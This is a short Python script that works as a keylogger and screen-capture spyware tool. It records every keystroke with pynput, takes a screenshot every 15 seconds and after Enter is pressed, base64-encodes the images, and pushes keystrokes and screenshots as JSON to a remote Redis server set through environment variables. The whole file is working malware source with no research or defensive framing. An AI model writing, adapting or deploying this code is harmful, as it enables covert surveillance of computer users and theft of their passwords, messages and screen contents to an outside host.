import io
import time
import redis
import base64
import pyscreenshot
import os
import json
from pynput import keyboard
from dotenv import load_dotenv

# Load environment variables from .env file
load_dotenv()

# Connect to Redis using Upstash
redis_host = os.environ['REDIS_HOST']
redis_port = os.environ['REDIS_PORT']
redis_password = os.environ['REDIS_PASSWORD']
r = redis.Redis(host=redis_host, port=redis_port, password=redis_password, ssl=True)

# Initialize the keystroke buffer and the last key pressed
keystrokes = []
last_key = None

# Define the function to capture the screenshot and encode it to base64
def capture_screenshot():
    img = pyscreenshot.grab()
    buffer = io.BytesIO()
    img.save(buffer, format='JPEG')
    image_bytes = buffer.getvalue()
    image_data = base64.b64encode(image_bytes).decode('utf-8')
    return image_data

# Define the function to send the keystrokes and the screenshot to Redis
def send_data():
    # Combine the keystrokes into a string and clear the keystroke buffer
    keystrokes_str = ''.join(keystrokes)
    keystrokes.clear()

    # Capture the screenshot and encode it to base64
    image_data = capture_screenshot()

    # Create a dictionary with the keystrokes and the screenshot
    data = {'keystrokes': keystrokes_str, 'screenshot': image_data}
    doubleQuoted = json.dumps(data)
    # Send the json to Redis
    r.rpush('data', doubleQuoted)

# Define the function to handle key presses
def on_press(key):
    global keystrokes, last_key
    try:
        # Append the key to the keystroke buffer
        keystrokes.append(key.char)
        last_key = key
    except AttributeError:
        # Handle special keys like 'enter', 'space', etc.
        keystrokes.append('[' + str(key) + ']')
        last_key = key

# Define the function to handle key releases
def on_release(key):
    global last_key
    # If the user presses and releases the 'enter' key, send the data to Redis
    if key == keyboard.Key.enter and last_key == keyboard.Key.enter:
        send_data()
    last_key = None

# Start the key listener
listener = keyboard.Listener(on_press=on_press, on_release=on_release)
listener.start()

# Start the main loop
while True:
    # Wait for 15 seconds before taking the next screenshot
    time.sleep(15)
    # Send the data to Redis
    send_data()
